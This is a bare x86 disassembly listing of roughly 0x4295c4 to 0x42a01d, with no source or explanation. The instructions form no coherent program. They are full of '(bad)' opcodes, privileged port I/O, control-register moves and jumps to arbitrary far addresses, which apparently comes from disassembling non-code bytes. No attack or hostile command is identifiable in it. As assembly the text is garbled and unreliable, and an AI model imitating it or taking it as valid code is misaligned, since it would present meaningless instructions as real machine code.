  4295c4:	sub    edx,eax
  4295c6:	ja     0x42954c
  4295c8:	pop    edi
  4295c9:	lahf   
  4295ca:	jno    0x4295f7
  4295cc:	loop   0x42955e
  4295ce:	clc    
  4295cf:	stc    
  4295d0:	jecxz  0x42963d
  4295d2:	lods   al,BYTE PTR ds:[esi]
  4295d3:	sar    eax,0xfb
  4295d6:	jno    0x429626
  4295d8:	and    BYTE PTR [ecx+ebp*1],dh
  4295db:	nop
  4295dc:	cld    
  4295dd:	add    BYTE PTR [eax],dl
  4295df:	mov    edx,0xdf08b98f
  4295e4:	pop    ebp
  4295e5:	mov    bh,0x69
  4295e7:	shl    BYTE PTR [ecx+edx*2-0x19],1
  4295eb:	popf   
  4295ec:	repz jmp 0x429664
  4295ef:	data16 daa 
  4295f1:	fisubr DWORD PTR [ecx+0x4c]
  4295f4:	push   0xe75d9feb
  4295f9:	gs push edi
  4295fb:	mov    ds:0xd2c223f0,eax
  429600:	and    BYTE PTR [ebp+ecx*2-0x6fcca20b],al
  429607:	gs sbb eax,0xeb9ebfc3
  42960d:	data16 ins BYTE PTR es:[edi],dx
  42960f:	pushf  
  429610:	pop    esi
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	aaa    
  429681:	retf   0x6405
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	mov    ds:0xd60541f3,al
  429691:	(bad)  
  429692:	mov    esi,0x976745fb
  429697:	hlt    
  429698:	dec    ebx
  429699:	iret   
  42969a:	outs   dx,BYTE PTR ds:[esi]
  42969b:	in     al,dx
  42969c:	mov    gs,edx
  42969e:	in     eax,0x66
  4296a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296a1:	push   ss
  4296a2:	clc    
  4296a3:	(bad)  
  4296a4:	jp     0x429628
  4296a6:	or     BYTE PTR [edi-0x55],bl
  4296a9:	je     0x42970b
  4296ab:	outs   dx,DWORD PTR ds:[esi]
  4296ac:	adc    BYTE PTR [ebx-0x25],bl
  4296af:	jb     0x429664
  4296b1:	int    0x5
  4296b3:	ja     0x4296a7
  4296b5:	cwd    
  4296b7:	inc    eax
  4296b8:	arpl   WORD PTR [edi],bp
  4296ba:	rcl    BYTE PTR [edx],0x40
  4296bd:	in     al,0x6d
  4296bf:	or     bl,0x67
  4296c2:	adc    edi,DWORD PTR [edi]
  4296c4:	loope  0x4296fa
  4296c6:	aam    0x70
  4296c8:	lea    edi,[ebp-0x67a8732e]
  4296ce:	sbb    bh,BYTE PTR [ecx+0x62c6de1b]
  4296d4:	inc    esp
  4296d5:	push   ecx
  4296d6:	xor    eax,0x2ceb1504
  4296db:	in     eax,dx
  4296dc:	je     0x429747
  4296de:	(bad)  
  4296df:	sbb    eax,0xc4d91020
  4296e4:	adc    ecx,DWORD PTR [esi+ebp*8-0x49]
  4296e8:	jno    0x429677
  4296ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296eb:	sub    ch,dh
  4296ed:	sar    edx,1
  4296ef:	adc    al,0x3e
  4296f1:	imul   eax,ecx,0xffffffbb
  4296f4:	inc    ecx
  4296f5:	xor    edi,0x114d46cb
  4296fb:	push   cs
  4296fc:	pop    ss
  4296fd:	mov    al,ds:0x182ed912
  429702:	leave  
  429703:	cmp    al,0xa3
  429705:	test   DWORD PTR [edx],esi
  429707:	sub    bh,ah
  429709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42970a:	inc    ecx
  42970b:	mov    bh,0x96
  42970d:	cmc    
  42970e:	mov    al,0x8f
  429710:	push   cs
  429711:	daa    
  429712:	xlat   BYTE PTR ds:[ebx]
  429713:	and    al,0x46
  429715:	mov    fs,WORD PTR [ebx]
  429717:	jnp    0x4296b2
  429719:	mov    esp,0x39e365b1
  42971e:	cmc    
  42971f:	mov    esi,0x9f763d46
  429724:	mov    ss,ebx
  429726:	sub    al,0xa
  429728:	and    DWORD PTR [ecx+0x5fc8d62d],ebp
  42972e:	(bad)  
  42972f:	mov    eax,0xcf3f8d2f
  429734:	inc    esp
  429735:	pop    eax
  429736:	cld    
  429737:	repnz push eax
  429739:	pop    esp
  42973a:	mov    dl,0xe6
  42973c:	mov    bl,0x2f
  42973e:	es jmp 0x306f:0x4466d4ef
  429746:	fmul   QWORD PTR ds:0x79b42fae
  42974c:	sbb    eax,0x5cec7c11
  429751:	in     eax,dx
  429752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429753:	mov    ds:0xe335d5b1,al
  429758:	sub    eax,0xce0d0c0
  42975d:	mov    dh,0xba
  42975f:	icebp  
  429760:	std    
  429761:	pop    eax
  429762:	jnp    0x4297cf
  429764:	or     ah,BYTE PTR [edx]
  429766:	adc    DWORD PTR ds:0x48715345,edi
  42976c:	sbb    al,0xb4
  42976e:	pusha  
  42976f:	pop    eax
  429770:	push   esp
  429771:	cld    
  429772:	inc    DWORD PTR [edx+eiz*8+0x58]
  429776:	je     0x429705
  429778:	mov    ah,0x8c
  42977a:	jg     0x429798
  42977c:	mov    eax,ebp
  42977e:	in     eax,dx
  42977f:	in     al,0x7a
  429781:	stos   DWORD PTR es:[edi],eax
  429782:	mov    WORD PTR [edi+0x77],ss
  429785:	das    
  429786:	mov    eax,ds:0x70e1ada1
  42978b:	cs jns 0x4297c7
  42978e:	mov    dh,0xde
  429790:	sub    DWORD PTR [eax],eax
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	rcl    BYTE PTR [edx],0xbf
  429803:	xor    BYTE PTR [edx-0x44],bl
  429806:	add    DWORD PTR [eax],eax
  429808:	add    eax,0x85000001
  42980d:	inc    esp
  42980e:	dec    ebp
  42980f:	sbb    eax,0xf252b0cd
  429814:	pusha  
  429815:	add    edx,esp
  429817:	in     al,dx
  429818:	loop   0x42986f
  42981a:	repnz mov esp,0x47a6448a
  429820:	shr    BYTE PTR gs:[edi-0x5d4c7157],cl
  429827:	sbb    ah,BYTE PTR [edi]
  429829:	xchg   DWORD PTR ds:0x11ccdc1b,ecx
  42982f:	pop    edx
  429830:	je     0x4297cf
  429832:	push   esi
  429833:	into   
  429834:	sbb    edi,0xffffffe4
  429837:	adc    BYTE PTR [esi-0x1f],ah
  42983a:	test   BYTE PTR [edx+0x19],0x13
  42983e:	call   0xa7f7132e
  429843:	cmp    esp,DWORD PTR [edi]
  429845:	jg     0x429885
  429847:	jo     0x4298b7
  429849:	jmp    0x429896
  42984b:	inc    edi
  42984c:	shl    DWORD PTR [esi+0x52],cl
  42984f:	nop
  429850:	xchg   ebp,eax
  429851:	and    bh,0x86
  429854:	add    DWORD PTR [ecx+0x91a1ea4],0xd9bd8494
  42985e:	lahf   
  42985f:	out    0xf3,eax
  429861:	es out dx,al
  429863:	add    ebp,edx
  429865:	scas   al,BYTE PTR es:[edi]
  429866:	pop    es
  429867:	es mov dl,0xdc
  42986a:	inc    edi
  42986b:	(bad)  
  42986c:	mov    edx,0xe29a7a0e
  429871:	push   ds
  429872:	pop    es
  429873:	push   es
  429874:	pushf  
  429875:	mov    esi,0x2489d927
  42987a:	ins    DWORD PTR es:[edi],dx
  42987b:	outs   dx,BYTE PTR ds:[esi]
  42987c:	ret    0x8087
  42987f:	jmp    0x4298cf
  429881:	jbe    0x429803
  429883:	push   0x5ae9fc95
  429888:	sub    DWORD PTR [edx],edi
  42988a:	cdq    
  42988b:	ret    
  42988c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42988d:	mov    BYTE PTR [ebp+0x4f57236a],bh
  429893:	and    al,0xdf
  429895:	imul   eax,DWORD PTR [eax-0x7e],0xc81d889d
  42989c:	cld    
  42989d:	stos   DWORD PTR es:[edi],eax
  42989e:	retf   0x1df4
  4298a1:	call   0xebff:0x9e273620
  4298a8:	jno    0x42989a
  4298aa:	mov    edi,0xe3826a08
  4298af:	inc    esi
  4298b0:	pop    edx
  4298b1:	jl     0x4298d7
  4298b3:	dec    eax
  4298b4:	pop    ebp
  4298b5:	scas   eax,DWORD PTR es:[edi]
  4298b6:	sti    
  4298b7:	xchg   ebp,eax
  4298b8:	and    al,0x79
  4298ba:	into   
  4298bb:	outs   dx,DWORD PTR ds:[esi]
  4298bc:	sbb    al,0x46
  4298be:	fstp   DWORD PTR [ebp-0x7e]
  4298c1:	mov    bh,0x50
  4298c3:	add    al,0xb2
  4298c5:	mov    dh,0x8c
  4298c7:	jp     0x4298a9
  4298c9:	(bad)  
  4298ca:	les    edi,FWORD PTR [esi]
  4298cc:	stc    
  4298cd:	mov    al,0xc8
  4298cf:	and    al,0x84
  4298d1:	and    eax,0xe428dae6
  4298d6:	push   ebx
  4298d7:	outs   dx,DWORD PTR ds:[esi]
  4298d8:	(bad)  
  4298d9:	retf   0xe30a
  4298dc:	into   
  4298dd:	leave  
  4298de:	xor    al,0x25
  4298e0:	xor    bh,bl
  4298e2:	sar    BYTE PTR [edi+0x692ae82],cl
  4298e8:	ss or  ah,bl
  4298eb:	inc    esi
  4298ec:	cmp    DWORD PTR [ecx],esi
  4298ee:	sahf   
  4298ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298f0:	jmp    0x429884
  4298f2:	sub    al,0x4b
  4298f4:	jae    0x4298b1
  4298f6:	xchg   esp,eax
  4298f7:	cmp    BYTE PTR [ebx-0x62],bh
  4298fa:	sub    bl,cl
  4298fc:	jp     0x429926
  4298fe:	jle    0x429908
  429900:	push   ebx
  429901:	mov    edx,DWORD PTR [ebx-0xa20a731]
  429907:	add    eax,0x24e70cfc
  42990c:	sub    al,0x81
  42990e:	ret    
  42990f:	jo     0x4298b6
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	cmp    DWORD PTR [eax-0x42a0a774],ebp
  429986:	add    DWORD PTR [eax],eax
  429988:	add    eax,0x6a000001
  42998d:	cwd    
  42998f:	call   0x569200d
  429994:	sub    BYTE PTR [edi+0x7da64ac8],0x9c
  42999b:	cmp    DWORD PTR [ebp+0x20],ebx
  42999e:	or     eax,0xc6cf1072
  4299a3:	pop    es
  4299a4:	cli    
  4299a5:	push   esi
  4299a6:	(bad)  
  4299a7:	sti    
  4299a8:	lock fcomp QWORD PTR [edi-0x2]
  4299ac:	pop    esp
  4299ad:	push   ebp
  4299ae:	pop    ds
  4299af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299b0:	xlat   BYTE PTR ds:[ebx]
  4299b1:	sbb    BYTE PTR [edx],cl
  4299b3:	mov    BYTE PTR [edi+0x4a5fd993],dl
  4299b9:	retf   0xf2a3
  4299bc:	sbb    BYTE PTR [eax-0x7d],0xc1
  4299c0:	sbb    ah,ch
  4299c2:	jne    0x429a0a
  4299c4:	dec    edx
  4299c5:	loop   0x4299cb
  4299c7:	and    bl,BYTE PTR fs:[ebp+0x54899336]
  4299ce:	retf   0xaffb
  4299d1:	push   0xfc662e7a
  4299d6:	push   es
  4299d7:	in     al,dx
  4299d8:	gs push ebp
  4299da:	rcr    BYTE PTR [eax+0x6832d6fc],1
  4299e0:	stc    
  4299e1:	(bad)  
  4299e2:	fist   DWORD PTR [ecx+ecx*2]
  4299e5:	mov    edx,0xec0b2998
  4299ea:	lods   eax,DWORD PTR ds:[esi]
  4299eb:	dec    edx
  4299ec:	imul   ebx,esi,0xffffff9b
  4299ef:	rol    DWORD PTR [esi-0x3e3c933f],0x0
  4299f6:	mov    esp,0xaed686ab
  4299fb:	call   0x9316e7b2
  429a00:	adc    al,0xc9
  429a02:	pcmpgtd mm6,QWORD PTR [ebx]
  429a05:	jae    0x4299f5
  429a07:	icebp  
  429a08:	add    esi,ebp
  429a0a:	cmp    edx,DWORD PTR [ecx+esi*1+0x54629f30]
  429a11:	outs   dx,DWORD PTR ds:[esi]
  429a12:	(bad)  
  429a13:	jp     0x429a4b
  429a15:	jg     0x429a57
  429a17:	shl    BYTE PTR [ebx],cl
  429a19:	in     eax,0x42
  429a1b:	ins    DWORD PTR es:[edi],dx
  429a1c:	cmp    ah,cl
  429a1e:	jnp    0x429a83
  429a20:	jno    0x429a7a
  429a22:	cli    
  429a23:	xchg   DWORD PTR [ebp-0x1d541671],eax
  429a29:	mov    ebp,0x203e56bf
  429a2e:	cmp    dh,BYTE PTR [eax]
  429a30:	cmp    BYTE PTR [ebp+0x33],0x1f
  429a34:	fstp   DWORD PTR [ebx-0x2699cd1e]
  429a3a:	or     BYTE PTR [edi],cl
  429a3c:	mov    ds,WORD PTR [edx-0x7e]
  429a3f:	repz mov al,ds:0xcae2f74c
  429a45:	in     al,0xd0
  429a47:	xchg   esi,esp
  429a49:	aad    0x14
  429a4b:	or     al,0xe5
  429a4d:	dec    ebp
  429a4e:	enter  0xd69d,0x1
  429a52:	pmullw mm1,QWORD PTR cs:[edi-0x2]
  429a57:	ja     0x429a5b
  429a59:	daa    
  429a5a:	sub    eax,0xe383ac16
  429a5f:	mov    bh,ch
  429a61:	dec    edx
  429a62:	call   0x512d:0xe80809e1
  429a69:	xor    eax,esi
  429a6b:	mov    ebx,0x772ae3a5
  429a70:	sub    esp,DWORD PTR [ecx+ebx*2-0x4f0d1c6f]
  429a77:	aad    0xbd
  429a79:	call   0xc9256882
  429a7e:	jmp    0x3835574f
  429a83:	jl     0x429aa8
  429a85:	pushf  
  429a86:	call   0x3e4d:0x6e6812fd
  429a8d:	stos   BYTE PTR es:[edi],al
  429a8e:	add    esi,DWORD PTR [ebx+0xe3]
	...
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x18a95667
  429b01:	cmp    eax,DWORD PTR [eax+0x3f]
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	pop    esi
  429b0d:	test   BYTE PTR [eax+0x5e],ch
  429b10:	gs ins BYTE PTR es:[edi],dx
  429b12:	pop    es
  429b13:	push   ebp
  429b14:	pusha  
  429b15:	sbb    eax,0xc020ce4a
  429b1a:	jb     0x429aef
  429b1c:	dec    ebp
  429b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b1e:	and    DWORD PTR [ebp+0x7f0a54e8],esp
  429b24:	jo     0x429af1
  429b26:	(bad)  
  429b27:	das    
  429b28:	add    eax,0xfc367efb
  429b2d:	dec    ebp
  429b2e:	scas   al,BYTE PTR es:[edi]
  429b2f:	cwde   
  429b30:	hlt    
  429b31:	push   es
  429b32:	ret    0x49b1
  429b35:	push   0x5a308695
  429b3a:	inc    edx
  429b3b:	and    ah,ah
  429b3d:	mov    ds:0x70925712,eax
  429b42:	jl     0x429b96
  429b44:	repnz lds esi,FWORD PTR [esi+eiz*4-0x184e8cef]
  429b4c:	out    dx,eax
  429b4d:	or     dh,ch
  429b4f:	clc    
  429b50:	dec    ebp
  429b51:	ja     0x429b65
  429b53:	mov    ch,bl
  429b55:	(bad)  
  429b58:	ret    
  429b59:	(bad)  
  429b5a:	jns    0x429b17
  429b5c:	cli    
  429b5d:	stos   DWORD PTR es:[edi],eax
  429b5e:	imul   ecx,DWORD PTR [edi+0x2e],0xa7f6d645
  429b65:	mov    al,ds:0x1f73266c
  429b6a:	cld    
  429b6b:	aam    0x26
  429b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b6e:	(bad)  
  429b6f:	in     al,dx
  429b70:	jg     0x429b49
  429b72:	and    ecx,ebp
  429b74:	mov    ch,0x32
  429b76:	ror    BYTE PTR [edx],1
  429b78:	loope  0x429b47
  429b7a:	xchg   esp,eax
  429b7b:	iret   
  429b7c:	xor    DWORD PTR [edi],esi
  429b7e:	sub    BYTE PTR [ebx+edi*1-0x5a],bh
  429b82:	dec    edx
  429b83:	stos   DWORD PTR es:[edi],eax
  429b84:	mov    ebx,0xc7348ef1
  429b89:	jp     0x429b48
  429b8b:	and    DWORD PTR [edi+0x6630005b],ebx
  429b91:	push   ebp
  429b92:	sahf   
  429b93:	sub    esi,DWORD PTR [edi]
  429b95:	into   
  429b96:	leave  
  429b97:	pop    eax
  429b98:	or     BYTE PTR [ecx-0x10],ah
  429b9b:	jmp    0x429b7c
  429b9d:	mov    ebx,eax
  429b9f:	nop
  429ba0:	mov    dh,0xd5
  429ba2:	rol    BYTE PTR ss:[ebp+0x4c26b6d5],1
  429ba9:	fcomp  DWORD PTR [eax-0x432ee215]
  429baf:	icebp  
  429bb0:	pop    esi
  429bb1:	jle    0x429b91
  429bb3:	cli    
  429bb4:	or     eax,0xa72fb910
  429bb9:	stos   BYTE PTR es:[edi],al
  429bba:	test   BYTE PTR [ebp+eax*1-0x61139fc4],al
  429bc1:	cmp    DWORD PTR [eax-0x59],edi
  429bc4:	(bad)  
  429bc5:	daa    
  429bc6:	test   ebp,esi
  429bc8:	icebp  
  429bc9:	int    0xc2
  429bcb:	cmc    
  429bcc:	out    dx,eax
  429bcd:	or     dh,ch
  429bcf:	int    0xa0
  429bd1:	mov    ebx,cr6
  429bd4:	cmc    
  429bd5:	xchg   edx,eax
  429bd6:	xchg   edx,eax
  429bd7:	cmp    al,BYTE PTR [esp+esi*2-0x75]
  429bdb:	adc    cl,BYTE PTR [ebp+0x67]
  429bde:	jecxz  0x429c44
  429be0:	xlat   BYTE PTR ds:[ebx]
  429be1:	sti    
  429be2:	outs   dx,DWORD PTR ds:[esi]
  429be3:	cli    
  429be4:	xchg   edi,eax
  429be5:	xchg   BYTE PTR [edi-0x3eebf762],al
  429beb:	mov    ch,0x90
  429bed:	jno    0x429bc1
  429bef:	pop    eax
  429bf0:	stc    
  429bf1:	add    al,0x62
  429bf3:	xor    DWORD PTR [ebp+0x43],edi
  429bf6:	dec    esi
  429bf7:	hlt    
  429bf8:	add    eax,0x8eccbdbf
  429bfd:	pop    edi
  429bfe:	inc    esp
  429bff:	adc    cl,BYTE PTR [ebx-0x2c61ea58]
  429c05:	push   esp
  429c06:	leave  
  429c07:	adc    eax,0xc14b456
  429c0c:	fldz   
  429c0e:	imul   esi,DWORD PTR [edi-0x71],0x0
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [edx+0x691108ad],dl
  429c85:	mov    edi,0x1050001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	(bad)
  429c91:	sbb    BYTE PTR [ebp-0xf378de],bl
  429c97:	xor    eax,0x888a020
  429c9c:	or     DWORD PTR [ecx],esi
  429c9e:	pop    ebp
  429c9f:	lods   al,BYTE PTR ds:[esi]
  429ca0:	sbb    al,bl
  429ca2:	stos   BYTE PTR es:[edi],al
  429ca3:	push   ecx
  429ca4:	jmp    0xc9ca:0x16962c10
  429cab:	mov    esp,DWORD PTR [eax-0x2c579c79]
  429cb1:	push   ecx
  429cb2:	and    ebx,DWORD PTR [ecx]
  429cb4:	and    DWORD PTR [edx-0x2f183690],ecx
  429cba:	jnp    0x429cf1
  429cbc:	mul    DWORD PTR [ebp-0xd]
  429cbf:	and    al,0x46
  429cc1:	outs   dx,DWORD PTR ds:[esi]
  429cc2:	out    dx,eax
  429cc3:	sbb    ecx,esi
  429cc5:	mov    ds:0xe6fa3911,eax
  429cca:	push   esp
  429ccb:	push   ebp
  429ccc:	jmp    0x7bc8:0x9f89c3af
  429cd3:	in     eax,dx
  429cd4:	pop    es
  429cd5:	pop    esp
  429cd6:	sbb    al,0x47
  429cd8:	mov    esp,esp
  429cda:	ja     0x429ce3
  429cdc:	lahf   
  429cdd:	mov    al,ds:0x4cc3b49
  429ce2:	das    
  429ce3:	imul   ebx,DWORD PTR [eax],0x27
  429ce6:	add    al,0xbd
  429ce8:	iret   
  429ce9:	(bad)  [ecx+0x29]
  429cec:	das    
  429ced:	inc    ebx
  429cee:	xor    al,0xa1
  429cf0:	xor    cl,dh
  429cf2:	(bad)  
  429cf3:	fsubr  st(2),st
  429cf5:	outs   dx,BYTE PTR ds:[esi]
  429cf6:	js     0x429d23
  429cf8:	pop    ecx
  429cf9:	cwde   
  429cfa:	loope  0x429ca8
  429cfc:	shl    eax,1
  429cfe:	test   DWORD PTR [eax],esi
  429d00:	cmp    DWORD PTR [ebx+0x36b399d8],edx
  429d06:	xor    DWORD PTR [esi+0x2b11e869],ebp
  429d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d0d:	cmc    
  429d0e:	out    dx,eax
  429d0f:	pop    ebx
  429d10:	adc    BYTE PTR [edi],0xc0
  429d13:	scas   eax,DWORD PTR es:[edi]
  429d14:	sbb    ecx,DWORD PTR [ebp+0x66e76e70]
  429d1a:	fmul   QWORD PTR [eax]
  429d1c:	push   bx
  429d1e:	call   0xdbf8:0x71d82cd5
  429d25:	ins    DWORD PTR es:[edi],dx
  429d26:	cmp    DWORD PTR [eax-0x3a],esp
  429d29:	mov    ah,0xff
  429d2b:	mov    eax,0x76c605b8
  429d30:	inc    edi
  429d31:	mov    ebp,0x1ca9789a
  429d36:	jp     0x429d6b
  429d38:	xor    BYTE PTR [esi+0x5026859e],0xe9
  429d3f:	fwait
  429d40:	(bad)  
  429d41:	mov    edx,0xd1b8f540
  429d46:	sbb    BYTE PTR [ebx+0x25],bh
  429d49:	and    eax,0xf285f8bb
  429d4e:	jge    0x429cf2
  429d50:	jmp    0x6e65d7aa
  429d55:	call   0x5d89:0xff460a95
  429d5c:	push   es
  429d5d:	fsubr  QWORD PTR [edi]
  429d5f:	sbb    ebp,DWORD PTR [esi-0x26b0323c]
  429d65:	push   esi
  429d66:	add    BYTE PTR [esi+eax*4-0x70ce3333],0xe6
  429d6e:	mov    al,ds:0x738af767
  429d73:	stos   DWORD PTR es:[edi],eax
  429d74:	(bad)  
  429d75:	bound  ebx,QWORD PTR [edi-0x18856477]
  429d7b:	es cld 
  429d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d7e:	ret    0x861a
  429d81:	and    al,BYTE PTR [esi+0x40f3188c]
  429d87:	jae    0x429d28
  429d89:	add    edx,DWORD PTR [edi]
  429d8b:	xchg   esi,eax
  429d8c:	pop    edi
  429d8d:	and    BYTE PTR [esi-0x80],bh
  429d90:	xor    DWORD PTR [eax],eax
	...
  429df2:	add    BYTE PTR [eax],al
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	and    eax,DWORD PTR [ebp-0x5]
  429e03:	mov    ds:0x1c06e,al
  429e08:	add    eax,0xad000001
  429e0d:	lahf   
  429e0e:	clc    
  429e0f:	jb     0x429e7e
  429e11:	in     al,0x22
  429e13:	jae    0x429e39
  429e15:	scas   eax,DWORD PTR es:[edi]
  429e16:	not    cl
  429e18:	dec    edi
  429e19:	jne    0x429df8
  429e1b:	cmp    eax,0x449b4a8b
  429e20:	sbb    edx,DWORD PTR [edx-0x233f8c42]
  429e26:	sahf   
  429e27:	xchg   BYTE PTR [edi+0x4b19b75e],dh
  429e2d:	aaa    
  429e2e:	and    esp,ebx
  429e30:	mov    edx,0x86dfc2c2
  429e35:	mov    dl,0x9a
  429e37:	push   eax
  429e38:	sbb    al,0xdb
  429e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e3b:	and    BYTE PTR [ecx+0x25],bh
  429e3e:	out    0xda,eax
  429e40:	xchg   DWORD PTR [edx+0x17],ebp
  429e43:	pop    ds
  429e44:	int3   
  429e45:	dec    ecx
  429e46:	cwde   
  429e47:	scas   al,BYTE PTR es:[edi]
  429e48:	mov    ch,0xee
  429e4a:	xor    al,0xb5
  429e4c:	call   0xdef3:0xa959c73b
  429e53:	pop    ds
  429e54:	sti    
  429e55:	or     BYTE PTR [ebp+0x5b],al
  429e58:	push   esp
  429e59:	dec    BYTE PTR [ebx-0x2d]
  429e5c:	arpl   WORD PTR [esi],si
  429e5e:	mov    ecx,0x15151c47
  429e63:	retf   0xeec5
  429e66:	push   ecx
  429e67:	(bad)  
  429e69:	inc    edx
  429e6a:	stos   DWORD PTR es:[edi],eax
  429e6b:	(bad)  
  429e6d:	aas    
  429e6e:	mov    ebx,0xbe1c44fb
  429e73:	fwait
  429e74:	mov    ecx,0xc6a2cd17
  429e79:	jne    0x429ea0
  429e7b:	(bad)  
  429e7c:	scas   al,BYTE PTR es:[edi]
  429e7d:	add    ebx,DWORD PTR [ebp+ebp*8+0x1f]
  429e81:	ret    0xf5ba
  429e84:	popf   
  429e85:	sub    ah,BYTE PTR [ebp-0x5cdebae7]
  429e8b:	into   
  429e8c:	loope  0x429e43
  429e8e:	or     DWORD PTR [ebx+0xf4440ce],ebx
  429e94:	pop    esi
  429e95:	add    ax,0x5d08
  429e99:	xchg   edi,eax
  429e9a:	addr16 ss jg 0x429e34
  429e9e:	and    ch,BYTE PTR [edx+0x28]
  429ea1:	push   ecx
  429ea2:	(bad)  
  429ea3:	dec    DWORD PTR [edi-0xf]
  429ea6:	fsub   DWORD PTR [eax-0x405deb27]
  429eac:	or     eax,0x33b100db
  429eb1:	call   DWORD PTR ds:0x83921bb9
  429eb7:	jae    0x429f0e
  429eb9:	jecxz  0x429ed6
  429ebb:	rcr    dh,1
  429ebd:	xchg   edx,eax
  429ebe:	or     dl,BYTE PTR [edx+eiz*1+0xa95d925]
  429ec5:	cli    
  429ec6:	adc    eax,0x4f4142f3
  429ecb:	ds out dx,al
  429ecd:	js     0x429eda
  429ecf:	push   es
  429ed0:	pushf  
  429ed1:	push   esp
  429ed2:	pop    edi
  429ed3:	fdivr  DWORD PTR [ebx+edi*8+0x3f]
  429ed7:	jg     0x429e60
  429ed9:	pushf  
  429eda:	into   
  429edb:	adc    BYTE PTR [edi+edi*2-0x32],al
  429edf:	aaa    
  429ee0:	sbb    BYTE PTR [edi-0x7ce34ab4],dl
  429ee6:	aam    0x74
  429ee8:	and    ch,BYTE PTR [ebp-0x5a288e68]
  429eee:	dec    eax
  429eef:	aad    0x1c
  429ef1:	mov    ebx,0x16dda21b
  429ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ef7:	add    eax,DWORD PTR [edi-0x7282b5a8]
  429efd:	jmp    0x91ab3a1e
  429f02:	push   0x20dd76c6
  429f07:	add    al,0x73
  429f09:	and    BYTE PTR [edi],bl
  429f0b:	cmp    ebx,ebx
  429f0d:	jns    0x429f6b
  429f0f:	jnp    0x429f21
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x148bb0f6]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0xad000001
  429f8d:	mov    ds:0x4fe2bc1a,eax
  429f92:	jbe    0x429f1d
  429f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f95:	xchg   ebp,eax
  429f96:	(bad)  
  429f98:	fwait
  429f99:	sbb    dl,BYTE PTR [ebp+0x2d958bec]
  429f9f:	out    0xfe,eax
  429fa1:	aad    0x40
  429fa3:	adc    edx,0x6
  429fa6:	(bad)  
  429fa7:	jmp    0x15003286
  429fac:	xchg   ebp,eax
  429fad:	inc    edx
  429fae:	and    BYTE PTR [esi+0x2c],0xdb
  429fb2:	cmp    BYTE PTR [ebx],0xba
  429fb5:	mov    edx,0x42b19670
  429fba:	jp     0x429ff4
  429fbc:	mov    ds:0x3758f1d0,eax
  429fc1:	push   esi
  429fc2:	(bad)  
  429fc3:	xchg   esp,eax
  429fc4:	leave  
  429fc5:	inc    edx
  429fc6:	shl    DWORD PTR [eax],1
  429fc8:	or     eax,0x61afb376
  429fcd:	rol    BYTE PTR [ebx],cl
  429fcf:	cmp    DWORD PTR [edx],eax
  429fd1:	cs mov esi,0xf7f59e5d
  429fd7:	mov    ah,0x1a
  429fd9:	fwait
  429fda:	rep stos BYTE PTR es:[edi],al
  429fdc:	imul   DWORD PTR [esi-0x796aa0a]
  429fe2:	sub    ch,BYTE PTR [edx]
  429fe4:	sub    BYTE PTR [eax+0x73930744],dl
  429fea:	xchg   ebp,eax
  429feb:	xor    bl,BYTE PTR [ebp+0x0]
  429fee:	pushf  
  429fef:	xor    BYTE PTR [edi-0x31],0xe7
  429ff3:	dec    ecx
  429ff4:	push   esp
  429ff5:	jb     0x42a055
  429ff7:	test   al,0x84
  429ff9:	inc    ebp
  429ffa:	or     bh,BYTE PTR [eax]
  429ffc:	aas    
  429ffd:	xchg   edi,eax
  429ffe:	jb     0x42a054
  42a000:	or     al,0xb9
  42a002:	sub    BYTE PTR [eax-0x80],dh
  42a005:	mov    ecx,?
  42a007:	sub    DWORD PTR [edi-0x14],0xffffffd2
  42a00b:	inc    esp
  42a00c:	and    bh,BYTE PTR [esi+0x400043e9]
  42a012:	inc    ebp
  42a013:	xchg   edi,eax
  42a014:	push   ebp
  42a015:	dec    edi
  42a016:	mov    edx,0x82df082e
  42a01b:	int    0x28
  42a01d:	lock cmp al,BYTE PTR [edi]
